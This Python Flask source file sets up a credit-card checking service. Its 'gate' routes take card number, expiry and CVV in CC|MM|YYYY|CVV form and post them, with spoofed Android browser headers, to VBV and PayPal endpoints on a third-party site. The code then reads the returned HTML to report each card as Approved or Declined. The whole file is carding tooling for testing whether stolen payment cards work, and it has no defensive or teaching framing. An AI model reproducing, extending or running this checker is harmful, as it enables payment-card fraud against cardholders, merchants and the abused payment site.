from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

def process_response(raw_text):
    """Extract status and response message from raw HTML"""
    # Check for approved status
    if 'text-success">APPROVED<' in raw_text:
        status = "Approved"
        # Extract the success message
        parts = raw_text.split('class="text-success">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "AUTHENTICATE_SUCCESSFUL"
    else:
        status = "Declined"
        # Extract the declined message
        parts = raw_text.split('class="text-danger">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "UNKNOWN_RESPONSE"
    
    return {
        "response": response_msg,
        "status": status
    }

@app.route('/gate=vbv2/key=waslost/cc=<path:cc_details>')
def check_vbv(cc_details):
    return process_payment(cc_details, 'Vbv.php')

@app.route('/gate=paypal/key=waslost/cc=<path:cc_details>')
def check_paypal(cc_details):
    return process_payment(cc_details, 'Paypal.php')

def process_payment(cc_details, endpoint):
    # Basic CC format check (CC|MM|YYYY|CVV)
    if not len(cc_details.split('|')) == 4:
        return jsonify({
            'error': 'Invalid format. Use CC|MM|YYYY|CVV'
        }), 400

    headers = {
        'authority': 'wizvenex.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wizvenex.com',
        'referer': 'https://wizvenex.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {'lista': cc_details}

    try:
        response = requests.post(
            f'https://wizvenex.com/{endpoint}',
            headers=headers,
            data=data,
            timeout=300
        )
        return jsonify(process_response(response.text))

    except requests.exceptions.Timeout:
        return jsonify({
            "response": "TIMEOUT_ERROR",
            "status": "Error",
            "message": "Request timed out after 300 seconds"
        }), 408
    except Exception as e:
        return jsonify({
            "response": "REQUEST_FAILED",
            "status": "Error",
            "message": str(e)
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6566)
